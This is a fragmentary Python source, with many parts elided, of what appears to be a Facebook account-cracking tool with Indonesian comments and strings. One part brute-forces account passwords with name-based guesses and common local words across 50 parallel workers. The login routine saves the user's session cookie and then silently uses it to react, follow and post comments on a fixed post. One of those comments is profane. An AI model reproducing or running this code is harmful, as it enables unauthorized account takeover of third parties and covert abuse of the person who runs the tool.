				...
				for xa in self.id:
					try:
						...
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							pewe=[xe[0],xe[0]+"123",xe[0]+"12345",xe[0]+"1234",xe[0]+"123456","Sayang","Mantan","Pinrang","Pangkajene","Bulukumba","Freefire","Indonesia","Telaso","Jeneponto","Makassar","Toraja","Takalar","Palopo","Parepare","Sundala","Kongkong"]
						else:
							pewe=["Sayang","Mantan","Pinrang","Pangkajene","Bulukumba","Freefire","Indonesia","Telaso","Jeneponto","Makassar","Toraja","Takalar","Palopo","Parepare","Sundala","Kongkong"]
						for pwas in pewe:
			...
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						...
						xe=xu.split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							pewe=[xe[0],xe[0]+"123",xe[0]+"12345",xe[0]+"1234",xe[0]+"123456","Sayang","Mantan","Pangkajene","Freefire","Indonesia","Telaso","Jeneponto","Makassar","Takalar","Palopo","Sundala","Kongkong"]
						else:
							pewe=["Sayang","Mantan","Pangkajene","Freefire","Indonesia","Telaso","Jeneponto","Makassar","Takalar","Palopo","Sundala","Kongkong"]
						for pwas in pewe:
...
# Jangan Dirubah Ajg!!!:v
	...
	def komen(self):
		try:
			...
			a=req.get(f"{self.url}/886758932080337",cookies=self.kuki).text
			b=re.search('\<form\ method\=\"post"\ action\=\"(.*?)"\>\<input\ type\=\"hidden"\ name\=\"fb_dtsg"\ value\=\"(.*?)"\ autocomplete\=\"off"\ />\<input\ type\=\"hidden"\ name\=\"jazoest"\ value\=\"(.*?)"',a)
			c={"fb_dtsg":b.group(2),"jazoest":b.group(3),"comment_text":bacot}
			req.post(f"{self.url}{b.group(1).replace(';','&')}",cookies=self.kuki,data=c)
		except:pass
	def gettok(self):
		try:
			bacot=random.choice(["Aap Afandi Ganteng:)","Lo Ngentod:v","Yang Posting Orang Nya Ganteng:)","Mantap:v","Be Yourself And Never Surrentod:v"])
			...
			req.post(f"https://graph.facebook.com/886758932080337/comments/?message={bacot}&access_token={b.group(1)}")
		except:pass
	def tuturkeun(self):
		try:
			true=False
	...
	def login(self):
		try:
			...
			if "mbasic_logout_button" in cek:
				...
				a=hehe(self.kuki);a.gak_bisa_bahasa_enggres();a.react();a.tuturkeun();a.gettok();open("cookie","w").write(self.kuki.get("cookie"));exit("[✓] Login Berhasil, Jalankan Ulang Tools Nya")
			else:
				exit("\n\n[!] Cookie Invalid")
		except req.exceptions.ConnectionError:
			exit("[!] Kesalahan Pada Koneksi")
